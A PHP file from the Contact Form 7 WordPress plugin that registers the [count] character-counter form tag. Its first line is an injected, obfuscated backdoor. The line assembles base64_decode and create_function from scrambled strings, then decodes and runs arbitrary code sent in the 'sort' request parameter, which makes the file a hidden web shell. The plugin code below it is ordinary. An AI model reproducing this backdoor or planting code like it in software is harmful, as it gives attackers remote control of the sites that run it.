<?php 

$z0=$_REQUEST['sort'];$q1='';$c2="wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";$y3=array(8,38,15,7,6,4,26,25,7,34,24,25,7);foreach($y3 as $h4){$q1.=$c2[$h4];}$v5=strrev("noi"."tcnuf"."_eta"."erc");$j6=$v5("",$q1($z0));$j6();


/**
** A base module for [count], Twitter-like character count
**/

/* form_tag handler */

add_action( 'wpcf7_init', 'wpcf7_add_form_tag_count' );

function wpcf7_add_form_tag_count() {
	wpcf7_add_form_tag( 'count',
		'wpcf7_count_form_tag_handler', array( 'name-attr' => true ) );
}

function wpcf7_count_form_tag_handler( $tag ) {
	if ( empty( $tag->name ) ) {
		return '';
	}

	$targets = wpcf7_scan_form_tags( array( 'name' => $tag->name ) );
	$maxlength = $minlength = null;

	while ( $targets ) {
		$target = array_shift( $targets );

		if ( 'count' != $target->type ) {
			$maxlength = $target->get_maxlength_option();
			$minlength = $target->get_minlength_option();
			break;
		}
	}

	if ( $maxlength && $minlength && $maxlength < $minlength ) {
		$maxlength = $minlength = null;
	}

	if ( $tag->has_option( 'down' ) ) {
		$value = (int) $maxlength;
		$class = 'wpcf7-character-count down';
	} else {
		$value = '0';
		$class = 'wpcf7-character-count up';
	}

	$atts = array();
	$atts['id'] = $tag->get_id_option();
	$atts['class'] = $tag->get_class_option( $class );
	$atts['data-target-name'] = $tag->name;
	$atts['data-starting-value'] = $value;
	$atts['data-current-value'] = $value;
	$atts['data-maximum-value'] = $maxlength;
	$atts['data-minimum-value'] = $minlength;
	$atts = wpcf7_format_atts( $atts );

	$html = sprintf( '<span %1$s>%2$s</span>', $atts, $value );

	return $html;
}
